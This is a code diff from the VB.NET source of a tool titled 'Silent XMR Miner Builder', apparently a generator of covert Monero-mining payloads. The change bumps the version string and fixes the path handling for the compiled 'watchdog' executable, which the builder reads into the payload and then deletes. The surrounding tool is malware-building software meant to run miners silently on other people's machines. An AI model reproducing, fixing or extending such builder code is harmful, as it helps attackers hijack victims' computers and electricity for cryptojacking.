@@ -25,7 +25,7 @@ Public Class Form1
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Try
-            MephForm1.Text = "Silent XMR Miner Builder 1.2.2"
+            MephForm1.Text = "Silent XMR Miner Builder 1.2.3"
         Catch ex As Exception
         End Try
 
@@ -157,6 +157,8 @@ Public Class Form1
                 If toggleWatchdog.Checked Then
 
                     txtLog.Text = txtLog.Text + ("Compiling Watchdog..." + vbNewLine)
+                    Dim watchdogpath = Path.GetDirectoryName(OutputPayload) & "\" & Path.GetFileNameWithoutExtension(OutputPayload) & "-watchdog.exe"
+
                     minerbuilder.Replace("DefWatchdog", "true")
 
                     Dim WatchdogSource = My.Resources.Watchdog
@@ -177,15 +179,15 @@ Public Class Form1
 
                     WatchdogSource = watchdogbuilder.ToString()
 
-                    Codedom.WatchdogCompiler(Path.GetFileNameWithoutExtension(OutputPayload) & "-watchdog.exe", WatchdogSource)
+                    Codedom.WatchdogCompiler(watchdogpath, WatchdogSource)
 
                     If Codedom.WatchdogOK Then
                         txtLog.Text = txtLog.Text + ("Compiled Watchdog!" + vbNewLine)
                         If FA.toggleCustomWatchdog.Checked Then
                             MessageBox.Show("Watchdog has been compiled and can be found in the same folder as the chosen miner path. Press OK after you're done with the Watchdog.")
                         End If
-                        watchdogdata = File.ReadAllBytes(Path.GetFileNameWithoutExtension(OutputPayload) & "-watchdog.exe")
-                        File.Delete(Path.GetFileNameWithoutExtension(OutputPayload) & "-watchdog.exe")
+                        watchdogdata = File.ReadAllBytes(watchdogpath)
+                        File.Delete(watchdogpath)
                     Else
                         txtLog.Text = txtLog.Text + ("Error compiling Watchdog!" + vbNewLine)
                     End If
